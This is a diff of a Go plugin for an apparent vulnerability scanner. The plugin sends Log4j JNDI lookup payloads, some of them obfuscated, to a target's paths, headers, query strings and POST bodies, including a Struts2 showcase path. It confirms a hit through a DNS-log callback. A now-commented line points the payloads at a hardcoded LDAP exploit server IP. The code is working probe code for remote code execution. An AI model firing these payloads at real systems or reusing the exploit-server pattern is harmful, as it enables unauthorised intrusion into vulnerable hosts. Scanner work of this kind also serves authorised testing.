@@ -7,40 +7,41 @@ import (
 	util "github.com/deenrookie/kunpeng-plus/utils"
 	"net/http"
 	"strings"
+	"time"
 )
 
-type log4jRCE struct {
+type log4jRCE2 struct {
 	info   plugin.Plugin
 	result []plugin.Plugin
 }
 
 func init() {
-	plugin.Regist("log4j", &log4jRCE{})
+	plugin.Regist("log4j", &log4jRCE2{})
 }
 
-func (d *log4jRCE) Init() plugin.Plugin {
+func (d *log4jRCE2) Init() plugin.Plugin {
 	d.info = plugin.Plugin{
-		Name:    "log4j RCE",
-		Remarks: "log4j 远程命令执行",
+		Name:    "log4j2 RCE DNSLOG",
+		Remarks: "log4j 远程命令执行 dnslog验证",
 		Level:   0,
 		Type:    "RCE",
 		Author:  "Deen",
 		References: plugin.References{
 			URL:  "https://www.anquanke.com/post/id/262670",
 			CVE:  "",
-			KPID: "KP-1002",
+			KPID: "KP-1003",
 		},
 	}
 	return d.info
 }
 
-func (d *log4jRCE) GetResult() []plugin.Plugin {
+func (d *log4jRCE2) GetResult() []plugin.Plugin {
 	var result = d.result
 	d.result = []plugin.Plugin{}
 	return result
 }
 
-func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
+func (d *log4jRCE2) Check(URL string, meta plugin.TaskMeta) bool {
 	domain := util.GetHostFromUrl(URL)
 
 	if domain == "" {
@@ -48,12 +49,13 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	}
 
 	_ = meta
-	randString := utils.RandStringRunes(6)
+	randString := utils.RandStringRunes(3)
 	// count := 0
 	randStr := domain + ".${:-" + randString + "}"
-	// trueWord := domain + "." + randString
+	//randStr := "xxx.${:-" + randString + "}"
+	trueWord := domain + "." + randString
 	// randStr = "nowqq" + utils.RandStringRunes(6)
-	fmt.Println(domain)
+	fmt.Println(randStr)
 	payloads := []string{
 		//"${j${::-}n${::-}d${::-}i:l${::-}d${::-}a${::-}p://",
 		//"${jndi:lda${:-}p://",
@@ -73,6 +75,7 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 		"/error",
 		"/api",
 		"/redirect",
+		"/struts2-showcase/token/transfer4.action",
 	}
 
 	headers := []string{
@@ -98,14 +101,16 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 	totalCount := 0
 
 	for _, payload := range payloads {
-		// fullPayload := payload
+		var request *http.Request
 		fullPayload := fmt.Sprintf("%s%s.%s/}?a", payload, randStr, utils.DNS_LOG_DOMAIN)
-		fullPayload = fmt.Sprintf("%s134.175.244.170:1389/exp8/%s}", payload, domain)
+		request, _ = http.NewRequest("GET", URL+"/"+payload, nil)
+		_, _ = util.RequestDo(request, false)
+		//fullPayload = fmt.Sprintf("%s134.175.244.170:1389/exp8/%s}", payload, domain)
 		for _, reqPath := range reqPaths {
 			for _, method := range methods {
-				var request *http.Request
+
 				if method == "POST" {
-					postData := fmt.Sprintf("payload=%s&username=%s&password=%s&character_encoding=UTF-8", fullPayload, fullPayload, fullPayload)
+					postData := fmt.Sprintf("struts.token.name=%spayload=%s&username=%s&password=%s&character_encoding=UTF-8",fullPayload, fullPayload, fullPayload, fullPayload)
 					request, _ = http.NewRequest(method, URL+reqPath, strings.NewReader(postData))
 				} else {
 					request, _ = http.NewRequest(method, URL+reqPath, nil)
@@ -158,6 +163,14 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 
 				}
 
+				if utils.IsExistDNSLog(trueWord) {
+					result := d.info
+					result.Response = "TEST"
+					result.Request = "TEST"
+					d.result = append(d.result, result)
+					return true
+				}
+
 				request, _ = http.NewRequest(method, URL+reqPath+"?id="+fullPayload, nil)
 				for _, header := range headers {
 					if timeOutCount > 2 && normalRequestCount < 3 && totalCount > 5 {
@@ -200,28 +213,28 @@ func (d *log4jRCE) Check(URL string, meta plugin.TaskMeta) bool {
 						timeOutCount++
 					}
 				}
-				// fmt.Println(count)
-				// count++
-				//if utils.IsExistDNSLog(trueWord) {
-				//	result := d.info
-				//	result.Response = "TEST"
-				//	result.Request = "TEST"
-				//	d.result = append(d.result, result)
-				//	return true
-				//}
+				//fmt.Println(count)
+				//count++
+				if utils.IsExistDNSLog(trueWord) {
+					result := d.info
+					result.Response = "TEST"
+					result.Request = "TEST"
+					d.result = append(d.result, result)
+					return true
+				}
 			}
 		}
 
 	}
 
-	//time.Sleep(time.Duration(5) * time.Second)
-	//
-	//if utils.IsExistDNSLog(trueWord) {
-	//	result := d.info
-	//	result.Response = "TEST"
-	//	result.Request = "TEST"
-	//	d.result = append(d.result, result)
-	//	return true
-	//}
+	time.Sleep(time.Duration(10) * time.Second)
+
+	if utils.IsExistDNSLog(trueWord) {
+		result := d.info
+		result.Response = "TEST"
+		result.Request = "TEST"
+		d.result = append(d.result, result)
+		return true
+	}
 	return false
 }
